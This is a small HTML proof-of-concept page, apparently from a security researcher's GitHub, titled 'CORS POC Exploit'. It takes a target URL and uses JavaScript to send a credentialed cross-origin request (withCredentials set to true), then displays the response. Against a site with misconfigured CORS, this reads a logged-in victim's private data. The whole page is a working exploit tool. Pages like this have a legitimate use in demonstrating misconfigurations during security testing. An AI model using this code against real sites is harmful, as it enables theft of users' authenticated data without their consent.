<!DOCTYPE html>
<html>
<head>
    <title>CORS POC Exploit</title>
</head>
<body>
    <center>
        <h2>CORS POC Exploit</h2>
        <h3>Created by <a href="https://github.com/Anhedoniczz/">@Anhedoniczz</a></h3>
    </center>
    <hr size="1" width="80%">

    <center>
        <input type="text" id="targetUrl" placeholder="Enter the vulnerable URL" style="width:75%; padding:5px;">
        <br><br>
        <button onclick="exploitCORS()">Fetch from the target!</button>
        <hr size="1" width="80%">
        <textarea id="fetchedResource" rows="10" cols="50" style="width:75%" placeholder="Click on the button to fetch resource!"></textarea>
    </center>

    <script>
        function exploitCORS() {
            const url = document.getElementById("targetUrl").value;

            if (!url) {
                alert("Please enter a valid URL.");
                return;
            }

            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('GET', url, true);
            req.withCredentials = true;
            req.send();
        }

        function reqListener() {
            document.getElementById("fetchedResource").value = this.responseText;
        }
    </script>
</body>
</html>
